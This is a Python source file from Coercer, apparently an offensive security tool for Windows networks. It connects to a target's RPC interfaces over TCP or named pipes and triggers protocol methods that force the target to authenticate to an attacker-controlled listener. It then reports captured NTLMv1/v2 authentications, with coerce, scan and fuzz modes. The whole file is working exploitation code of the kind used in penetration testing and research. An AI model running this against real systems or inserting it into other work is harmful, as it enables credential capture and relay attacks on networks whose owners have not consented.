#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : execute.py
# Author             : Podalirius (@podalirius_) / p0rtL (@p0rtL6)
# Date created       : 3 Dec 2024

import time

from coercer.core.Reporter import reporter
from coercer.core.utils import (generate_exploit_path_from_template,
                                generate_exploit_templates)
from coercer.network.authentications import (trigger_and_catch_authentication,
                                             trigger_authentication)
from coercer.network.DCERPCSession import DCERPCSession
from coercer.network.rpc import can_bind_to_interface_on_port, is_port_open
from coercer.network.smb import can_bind_to_interface, can_connect_to_pipe
from coercer.network.utils import get_next_http_listener_port
from coercer.structures import EscapeCodes
from coercer.structures.Modes import Modes
from coercer.structures.TestResult import TestResult
from coercer.structures.TransportType import TransportType


def execute_tasks(
    tasks,
    options,
    target,
    credentials,
    mode,
    listening_ip=None,
    ports=None,
    named_pipe_of_remote_machine=None,
):
    for transport_name, transport in tasks.items():
        if mode == Modes.FUZZ:
            exploit_paths = generate_exploit_templates()

        if mode == Modes.FUZZ or mode == Modes.SCAN:
            http_listen_port = 0

        if len(transport.keys()) == 0:
            return None

        transportType = TransportType[transport_name.upper()]

        if transportType == TransportType.NCACN_IP_TCP:
            if "dcerpc" not in options.filter_transport_name:
                continue

            iterable = ports or sorted(transport.keys())

            def can_connect_function(target, taskEntry, credentials):
                return is_port_open(target, taskEntry)

            can_bind_function = can_bind_to_interface_on_port

            def connect_function(dcerpc, target, taskEntry):
                return dcerpc.connect_ncacn_ip_tcp(target=target, port=taskEntry)

        elif transportType == TransportType.NCAN_NP:
            if "msrpc" not in options.filter_transport_name:
                continue

            iterable = (
                sorted(named_pipe_of_remote_machine)
                if named_pipe_of_remote_machine
                else sorted(transport.keys())
            )

            def can_connect_function(target, taskEntry, credentials):
                return can_connect_to_pipe(target, taskEntry, credentials)

            can_bind_function = can_bind_to_interface

            def connect_function(dcerpc, target, taskEntry):
                return dcerpc.connect_ncacn_np(target=target, pipe=taskEntry)

        for taskEntry in iterable:
            if can_connect_function(target, taskEntry, credentials):
                reporter.print(
                    transportType.value,
                    " '",
                    (taskEntry, EscapeCodes.BOLD_BRIGHT_BLUE),
                    "' is ",
                    ("accessible", EscapeCodes.BOLD_BRIGHT_GREEN),
                    "!",
                    symbol=("+", EscapeCodes.BRIGHT_GREEN),
                )

                if mode == Modes.COERCE or mode == Modes.SCAN:
                    tasks_inner = transport[taskEntry]
                elif mode == Modes.FUZZ:
                    tasks_inner = transport

                for uuid in sorted(tasks_inner.keys()):
                    for version in sorted(tasks_inner[uuid].keys()):
                        if can_bind_function(
                            target, taskEntry, credentials, uuid, version
                        ):
                            reporter.print_ok(
                                "   ",
                                "Successful bind to interface (%s, %s)!"
                                % (uuid, version),
                            )
                            for msprotocol_class in sorted(
                                tasks_inner[uuid][version],
                                key=lambda x: x.function["name"],
                            ):

                                if mode == Modes.COERCE or mode == Modes.SCAN:
                                    exploit_paths = (
                                        msprotocol_class.generate_exploit_templates(
                                            desired_auth_type=options.auth_type
                                        )
                                    )

                                elif (
                                    mode == Modes.FUZZ
                                    and options.only_known_exploit_paths
                                ):
                                    exploit_paths = (
                                        msprotocol_class.generate_exploit_templates(
                                            desired_auth_type=options.auth_type
                                        )
                                    )

                                stop_exploiting_this_function = False
                                for listener_type, exploitpath in exploit_paths:
                                    if stop_exploiting_this_function:
                                        # Got a nca_s_unk_if response, this function does not listen on the given interface
                                        continue

                                    if (
                                        mode == Modes.SCAN or mode == Modes.FUZZ
                                    ) and listener_type == "http":
                                        http_listen_port = get_next_http_listener_port(
                                            current_value=http_listen_port,
                                            listen_ip=listening_ip,
                                            options=options,
                                        )

                                    exploitpath = generate_exploit_path_from_template(
                                        template=exploitpath,
                                        listener=options.path_ip
                                        or listening_ip
                                        or options.listener_ip,
                                        http_listen_port=(
                                            http_listen_port
                                            if mode == Modes.FUZZ
                                            else options.http_port
                                        ),
                                        smb_listen_port=options.smb_port,
                                    )

                                    if options.path_ip:
                                        reporter.print_info(
                                            "      ",
                                            "Using user provided path: %s"
                                            % exploitpath,
                                            debug=True,
                                        )

                                    msprotocol_rpc_instance = msprotocol_class(
                                        path=exploitpath
                                    )
                                    dcerpc = DCERPCSession(credentials=credentials)
                                    connect_function(dcerpc, target, taskEntry)

                                    if dcerpc.session is not None:
                                        dcerpc.bind(
                                            interface_uuid=uuid,
                                            interface_version=version,
                                        )
                                        if dcerpc.session is not None:
                                            reporter.print_testing(
                                                msprotocol_rpc_instance
                                            )

                                            if mode == Modes.COERCE:
                                                result = trigger_authentication(
                                                    dcerpc_session=dcerpc.session,
                                                    target=target,
                                                    method_trigger_function=msprotocol_rpc_instance.trigger,
                                                )

                                            elif (
                                                mode == Modes.SCAN or mode == Modes.FUZZ
                                            ):
                                                result = trigger_and_catch_authentication(
                                                    options=options,
                                                    dcerpc_session=dcerpc.session,
                                                    target=target,
                                                    method_trigger_function=msprotocol_rpc_instance.trigger,
                                                    listenertype=listener_type,
                                                    listen_ip=listening_ip,
                                                    http_port=http_listen_port,
                                                )

                                            reporter.report_test_result(
                                                target=target,
                                                uuid=uuid,
                                                version=version,
                                                namedpipe="",
                                                msprotocol_rpc_instance=msprotocol_rpc_instance,
                                                result=result,
                                                exploitpath=exploitpath,
                                            )

                                            if result == TestResult.NCA_S_UNK_IF:
                                                stop_exploiting_this_function = True

                                            if (
                                                mode == Modes.SCAN
                                                and options.stop_on_ntlm_auth
                                                and result
                                                in [
                                                    TestResult.SMB_AUTH_RECEIVED_NTLMv1,
                                                    TestResult.SMB_AUTH_RECEIVED_NTLMv2,
                                                ]
                                            ):
                                                reporter.print_info(
                                                    "NTLM authentication received; moving on to next target"
                                                )
                                                return None

                                    if options.delay is not None:
                                        # Sleep between attempts
                                        time.sleep(options.delay)

                                    if (
                                        mode == Modes.COERCE
                                        and not options.always_continue
                                    ):
                                        next_action_answer = None
                                        while next_action_answer not in ["C", "S", "X"]:
                                            next_action_answer = input(
                                                "Continue (C) | Skip this function (S) | Stop exploitation (X) ? "
                                            )
                                            if len(next_action_answer) > 0:
                                                next_action_answer = (
                                                    next_action_answer.strip()[
                                                        0
                                                    ].upper()
                                                )
                                        if next_action_answer == "C":
                                            pass
                                        elif next_action_answer == "S":
                                            stop_exploiting_this_function = True
                                        elif next_action_answer == "X":
                                            return None
                        else:
                            if options.verbose:
                                reporter.print_error(
                                    "   ",
                                    "Cannot bind to interface (%s, %s)!"
                                    % (uuid, version),
                                )
            else:
                reporter.print(
                    transportType.value,
                    " '",
                    (taskEntry, EscapeCodes.BOLD_BRIGHT_BLUE),
                    "' ",
                    ("closed", EscapeCodes.BOLD_BRIGHT_RED),
                    "!",
                    symbol=("!", EscapeCodes.BRIGHT_RED),
                    verbose=True,
                )
